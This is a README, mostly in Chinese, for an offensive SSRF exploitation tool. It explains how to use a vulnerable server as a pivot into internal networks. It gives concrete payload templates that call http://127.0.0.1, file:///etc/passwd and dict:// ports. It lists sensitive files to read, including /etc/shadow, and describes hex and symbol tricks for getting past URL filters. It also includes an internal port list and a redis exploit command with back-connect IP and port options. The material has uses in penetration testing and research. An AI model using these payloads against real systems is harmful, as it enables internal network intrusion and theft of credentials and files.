# SSRF_ex
SSRF漏洞测试、利用 SSRF vulnerability testing and utilization

SSRF
[+] 服务端请求伪造，当作跳板攻击内网服务
[+] 扫描内部网络、服务
[+] 访问本机敏感文件
[+] 向特定端口发送数据包、payload

```
.
├── exploit
│   └── redis.py
├── lib
│   ├── check_bypass.py
│   ├── check.py
│   ├── common.py
│   ├── config.py
│   ├── scan.py
│   ├── test
│   └── xmltest.xml
├── plugin
│   └── weblogic.py
├── result
│   ├── 192.168.1.107
│   │   ├── file_content.log
│   │   ├── host_port.log
│   │   └── test.log
│   └── 192.168.1.109
│       ├── file_content.log
│       ├── host_port.log
│       └── test.log
├── ssrfex.py


>> ssrfex.py -u http://192.168.1.107/ssrf.php -d url 
```
流程：
```
缓存、存活判断--SSRF漏洞路径判断--简单测试--简单规则绕过--子网、端口扫描
                                  |                       |
                                  |                       |
                              file协议利用           端口Exploit利用
```
### 目标路径判断是否为已知存在漏洞服务
例如：   
```
#ssrf_list = [{'server':'weblogic','path':'/uddiexplorer/SearchPublicRegistries.jsp/uddiexplorer/SearchPublicRegistries.jsp'},{'server':'Splash','path':'/render.html'},{'server':'Typecho','path':'/action/xmlrpc'}]

plugin/weblogic.py -u 192.168.1.1 -p 192.168.1
```

### 简单测试
```
payload_http_inner = "{url}?{query}=http://127.0.0.1".format(url=target,query=parameter)
payload_file = "{url}?{query}=file:///etc/passwd".format(url=target,query=parameter)
payload_dict = "{url}?{query}=dict://127.0.0.1:22".format(url=target,query=parameter)
```
测试协议，通过响应时间、服务指纹、页面返回内容、~静态文件hash值~判断

### file协议读取特定文件
```
['/etc/rsyslog.conf','/etc/syslog.conf','/etc/passwd','/etc/shadow','/etc/group','/etc/anacrontab','/etc/networks','/etc/hosts']
```

### 简单规则绕过
lib/testxml.xml规则和payload
利用url解析，对ip、host等16进制变换以及添加符号绕过

### 端口扫描
```
[22, 80, 445, 3306, 6379, 7001, 8080, 11211]
```
### 内网存活扫描
dict协议，根据服务内容的hash值~时间~判断

### 端口扫描攻击特定端口
```
6379 redis
exploit/redis.py -u [host and parameter] -i [redis_ip] -bip [bip] -bport [bport]
```

### 待更新
* plugin已知SSRF漏洞插件更新：如：Wordpress Discuz Typecho
* SSRF攻击exploit利用：Jobss Mysql struts tomact memcache php-fpm等
* 规则优化
* 302跳转、DNS 利用

### 参考
[SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)
[SSRF bible Cheatsheet](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#)
[Build Your SSRF Exploit Framework](https://github.com/ring04h)
